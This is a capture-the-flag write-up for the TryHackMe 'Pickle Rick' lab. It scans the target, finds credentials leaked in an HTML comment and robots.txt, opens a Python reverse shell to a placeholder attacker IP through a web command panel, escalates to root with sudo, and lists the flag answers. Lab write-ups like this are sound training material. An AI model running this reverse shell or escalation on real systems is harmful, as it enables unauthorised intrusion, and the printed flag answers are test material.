---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - RCE
  - Sudo
---
https://tryhackme.com/room/picklerick/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.163.179 rick.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC rick.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a2:82:46:5c:79:ad:6a:54:96:7e:f6:30:cf:18:bd:9e (RSA)
|   256 04:57:f6:fb:2c:a6:6e:ae:d0:ad:0e:6f:a6:ba:c2:f9 (ECDSA)
|_  256 42:2b:3e:d5:0c:d4:fb:96:7e:9f:2d:ab:01:87:cd:54 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found **username** `R1ckRul3s` in HTML comment at http://rick.thm/index.html:
```html
<!--
	
	Note to self, remember username!
	
	Username: R1ckRul3s
	
-->
```
Found many directory paths:
```console
$ gobuster dir -q -b 403,404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://rick.thm/ -x php

/assets               (Status: 301) [Size: 305] [--> http://rick.thm/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```
Found `/robots.txt` file with a possible **password**:
```console
$ curl -s http://rick.thm/robots.txt

Wubbalubbadubdub
```
# Exploitation
Log in with **leaked credentials** at `/login.php`, then found a command panel at `/portal`, but many commands such as `cat` are being filtered.

Wait for connections:
```bash
nc -lvnp <PORT>
```
Executed the next command to establish a reverse shell connection:
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER-IP>",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
# Post-Exploitation
We can run any command as **root**:
```console
$ sudo -l

Matching Defaults entries for www-data on ip-10-10-163-179:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-163-179:
    (ALL) NOPASSWD: ALL
```
Become the **root user**:
```console
$ sudo su

# whoami
root
```
Get all the **ingredients**:
```console
# cat /var/www/html/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

# cat '/home/rick/second ingredients'
1 jerry tear

# cat /root/3rd.txt
3rd ingredients: fleeb juice
```